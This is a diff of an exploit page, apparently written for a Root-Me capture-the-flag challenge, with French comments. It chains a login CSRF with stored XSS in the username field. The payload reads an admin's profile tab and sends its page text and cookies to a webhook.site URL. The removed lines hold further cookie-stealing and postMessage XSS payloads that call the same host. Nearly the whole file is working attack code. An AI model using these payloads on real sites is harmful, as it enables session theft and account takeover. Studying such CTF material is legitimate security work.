@@ -1,19 +1,19 @@
-<!DOCTYPE html>
-<html>
-<body>
-  <script>
-var wb = 'http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba';
-var w = window.open('http://challenge01.root-me.org:58003/profile');
-//new Image().src = wb + '?popup=' + (w ? 'ok' : 'blocked');
+<script>
+// La fenêtre principale NE navigue PAS
+// 1. Ouvre le profil admin dans un onglet nommé
+window.open('http://challenge01.root-me.org:58003/profile', 'adminpf');
 
-if (w) {
-  setTimeout(function() {
-    //w.postMessage('<img src=x onerror="new Image().src=\'' + wb + '?d=\'+btoa(document.body.innerText)">', '*');
-    //w.postMessage("new Image().src='" + wb + "?d='+btoa(document.body.innerText)", '*');
-    //w.postMessage('<img src=x onerror="new Image().src=\'' + wb + '?c=\'+btoa(document.cookie)">', '*');
-    new Image().src = wb + '?msg='+document.cookie;
-  }, 2000);
-}
+setTimeout(function() {
+  // 2. CSRF login dans UN AUTRE onglet nommé 'loginwin'
+  var f = document.createElement('form');
+  f.method = 'POST';
+  f.action = 'http://challenge01.root-me.org:58003/login';
+  f.target = 'loginwin';
+  f.innerHTML = '<input name="username" value="var w=window.open('','adminpf');new Image().src='http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba?d='+btoa(w.document.body.innerText)+'&?c='+btoa(w.document.cookie)"><input name="secret" value="x">';
+  document.body.appendChild(f);
+  window.open('about:blank', 'loginwin');
+  f.submit();
+  // loginwin → login → redirect /profile → XSS tire
+  // XSS lit adminpf (même domaine) → secret admin
+}, 3000);
 </script>
-</body>
-</html>
